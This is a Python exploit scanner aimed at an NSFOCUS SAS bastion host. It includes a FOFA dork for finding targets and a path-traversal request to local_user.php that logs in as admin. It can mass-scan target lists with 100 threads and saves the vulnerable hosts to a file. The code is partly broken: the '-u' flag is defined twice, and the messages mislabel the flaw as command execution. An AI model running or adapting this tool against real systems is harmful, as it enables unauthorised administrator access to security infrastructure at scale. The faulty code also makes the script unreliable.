# fofa : body="'/needUsbkey.php?username='"

import argparse, requests, sys, time, re, json
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def banner():
    test = """
                ██╗    ██╗   ██╗███╗   ███╗███████╗███╗   ██╗ ██████╗ 
                ██║    ██║   ██║████╗ ████║██╔════╝████╗  ██║██╔════╝ 
                ██║    ██║   ██║██╔████╔██║█████╗  ██╔██╗ ██║██║  ███╗
                ██║    ╚██╗ ██╔╝██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║   ██║
                ███████╗╚████╔╝ ██║ ╚═╝ ██║███████╗██║ ╚████║╚██████╔╝
                ╚══════╝ ╚═══╝  ╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ 
                                                                    author:秋妤
                                                                    date:2024.09.25
                                                                    version:1.0
    """
    print(test)


def poc(target):
    api_payload = "/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin"
    headers = {
        'User-Agent': 'Mozilla/5.0(X11;Linuxx86_64;rv:91.0)Gecko/20100101Firefox/91.0',
        'Accept': 'text/javascript,text/html,application/xml,text/xml,*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip,deflate',
        'X-Requested-With': 'XMLHttpRequest',
        'X-Prototype-Version': '1.6.0.2',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'Te': 'trailers',
        'Connection': 'close'
    }

    try:
        response = requests.get(url=target + api_payload, headers=headers, verify=False, timeout=10)
        if response.status_code == 200 and '200' in response.text:
            print(f"[+]{target} 存在命令执行漏洞")
            with open('绿盟_result.txt', 'a') as fp:
                fp.write(f'{target} \n')
        else:
            print(f"[-]{target} 不存在命令执行漏洞")
    except:
        print(f"[*]无法访问")


def main():
    banner()
    url_list = []
    parser = argparse.ArgumentParser(description='这是一个 绿盟SAS堡垒机 local_user.php 任意用户登录漏洞 的扫描脚本')
    parser.add_argument('-u','--url',dest='url',help='Please enter url')
    parser.add_argument('-u', '--file', dest='file', help='Please enter file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()